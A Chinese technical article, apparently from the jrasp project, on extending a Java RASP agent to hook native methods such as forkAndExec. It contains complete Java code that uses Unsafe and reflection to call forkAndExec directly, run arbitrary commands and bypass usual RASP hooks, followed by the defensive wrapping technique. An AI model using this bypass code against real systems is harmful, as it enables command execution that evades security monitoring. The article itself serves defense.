为什么要支持 native 方法hook


       Java技术栈漏洞目前已经是web安全领域的主流战场，随着IPS、RASP等防御系统的更新迭代，攻防之间的对抗持续升级，出现了越来越多的针对RASP的绕过场景，其中一个重要的绕过场景是调用RASP很难hook的native方法。

      以远程命令执行为例，RASP一般会hook类java.lang.UnixProcess(jdk8以下)、java.lang.ProcessImpl(jdk9+)中的方法，命令执行最终会调用了系统的native方法：forkAndExec


    使用Unsafe+反射+Native方法调用,能够绕过常规hook点，执行任意命令。

具体步骤如下:

  1. 使用sun.misc.Unsafe.allocateInstance(Class)特性可以无需new或者newInstance创建UNIXProcess/ProcessImpl类对象。

  2. 反射UNIXProcess/ProcessImpl类的forkAndExec方法。

  3. 构造forkAndExec需要的参数并调用。

  4. 反射UNIXProcess/ProcessImpl类的initStreams方法初始化输入输出结果流对象。

  5. 反射UNIXProcess/ProcessImpl类的getInputStream方法获取本地命令执行结果(如果要输出流、异常流反射对应方法即可)。

import java.io.ByteArrayOutputStream;import java.io.InputStream;import java.lang.reflect.Field;import java.lang.reflect.Method;
import sun.misc.Unsafe;
public class NativeCommandExec {
    public static void exec() {        String[] cmdArray = {"touch", "/tmp/cmd.txt"};        try {            execNative(cmdArray);        } catch (Exception e) {            e.printStackTrace();        }    }
    public static void execNative(String[] strs) throws Exception {        if (strs != null) {            Field theUnsafeField = Unsafe.class.getDeclaredField("theUnsafe");            theUnsafeField.setAccessible(true);            Unsafe unsafe = (Unsafe) theUnsafeField.get(null);            Class processClass = null;            try {                processClass = Class.forName("java.lang.UNIXProcess");            } catch (ClassNotFoundException e) {                processClass = Class.forName("java.lang.ProcessImpl");            }            Object processObject = unsafe.allocateInstance(processClass);            // Convert arguments to a contiguous block; it's easier to do            // memory management in Java than in C.            byte[][] args = new byte[strs.length - 1][];            int size = args.length; // For added NUL bytes            for (int i = 0; i < args.length; i++) {                args[i] = strs[i + 1].getBytes();                size += args[i].length;            }            byte[] argBlock = new byte[size];            int i = 0;            for (byte[] arg : args) {                System.arraycopy(arg, 0, argBlock, i, arg.length);                i += arg.length + 1;                // No need to write NUL bytes explicitly            }            int[] envc = new int[1];            int[] std_fds = new int[]{-1, -1, -1};            Field launchMechanismField = processClass.getDeclaredField("launchMechanism");            Field helperpathField = processClass.getDeclaredField("helperpath");            launchMechanismField.setAccessible(true);            helperpathField.setAccessible(true);            Object launchMechanismObject = launchMechanismField.get(processObject);            byte[] helperpathObject = (byte[]) helperpathField.get(processObject);            int ordinal = (int) launchMechanismObject.getClass().getMethod("ordinal").invoke(launchMechanismObject);            Method forkMethod = processClass.getDeclaredMethod("forkAndExec", new Class[]{                    int.class, byte[].class, byte[].class, byte[].class, int.class,                    byte[].class, int.class, byte[].class, int[].class, boolean.class            });            forkMethod.setAccessible(true);// 设置访问权限            int pid = (int) forkMethod.invoke(processObject, new Object[]{                    ordinal + 1, helperpathObject, toCString(strs[0]), argBlock, args.length,                    null, envc[0], null, std_fds, false            });            // 初始化命令执行结果，将本地命令执行的输出流转换为程序执行结果的输出流            Method initStreamsMethod = processClass.getDeclaredMethod("initStreams", int[].class);            initStreamsMethod.setAccessible(true);            initStreamsMethod.invoke(processObject, std_fds);            // 获取本地执行结果的输入流            Method getInputStreamMethod = processClass.getMethod("getInputStream");            getInputStreamMethod.setAccessible(true);            InputStream in = (InputStream) getInputStreamMethod.invoke(processObject);            ByteArrayOutputStream baos = new ByteArrayOutputStream();            int a = 0;            byte[] b = new byte[1024];            while ((a = in.read(b)) != -1) {                baos.write(b, 0, a);            }        }    }

    public static byte[] toCString(String s) {        if (s == null) {            return null;        }        byte[] bytes = s.getBytes();        byte[] result = new byte[bytes.length + 1];        System.arraycopy(bytes, 0,                result, 0,                bytes.length);        result[result.length - 1] = (byte) 0;        return result;    }}

jrasp如何支持native方法hook

1.允许修改native方法前缀



2.将native方法封装变成普通java方法

    由于native方法没有方法体，不能直接插入字节码，必须包装成有方法体的方法，并且方法签名仅去掉native关键字。


例如，有一个native方法方法如下

native boolean foo(int x);

修改之后的方法：

// 包装为普通java方法boolean foo(int x) {  return wrapped_foo(x);}// 新增加一个native方法native boolean wrapped_foo(int x);

注意：这里的foo方法成为带有"wrapped_"前缀的native方法的包装器，这个包装方法将代替原来的native方法被调用。


3.新native方法与c++实现的链接

    方法wrapped_foo需要重新解析为foo的native实现。映射关系为：method(wrapped_foo) -> nativeImplementation(foo)，jvm会自动查找并完成方法native方法和c++实现的链接。


以forkAndExec方法为例说明

  1. 原始native增加方法体，变成非native方法；

  2. 在方法体中调用包装后的native方法 JRASPforkAndExec；

  3. 增加包装后的native方法；

  4. 在设置了native 方法的prefix后，jvm会自动完成native方法映射。



开发插件模块

    与开发普通java方法的插件模式是相同的。

1.注意事项

    以命令执行模块为例，需要说明的是：如果增强的方法是/hotspot/src/share/vm/classfile/vmSymbols.hpp 宏定义（参考资料链接2）


#define VM_INTRINSICS_DO(do_intrinsic, do_class, do_name, do_signature, do_alias)

    所定义的native方法，则需要VM参数中添加:

-XX:+UnlockDiagnosticVMOptions -XX:CompileCommand=dontinline,${ClassName}::${MethodName} -XX:DisableIntrinsic=${MethodNameId}

${ClassName}: 类全限定名，{MethodName}: 类方法名，${MethodNameId}：intrinsic id， 从宏定义：VM_INTRINSICS_DO第一个参数获取

举例 java.lang.System.currentTimeMillis

-XX:+UnlockDiagnosticVMOptions -XX:CompileCommand=dontinline,java.lang.System::currentTimeMillis -XX:DisableIntrinsic=_currentTimeMillis

      forkAndExec不在上面的声明的方法列表中，不需要修改jvm参数。
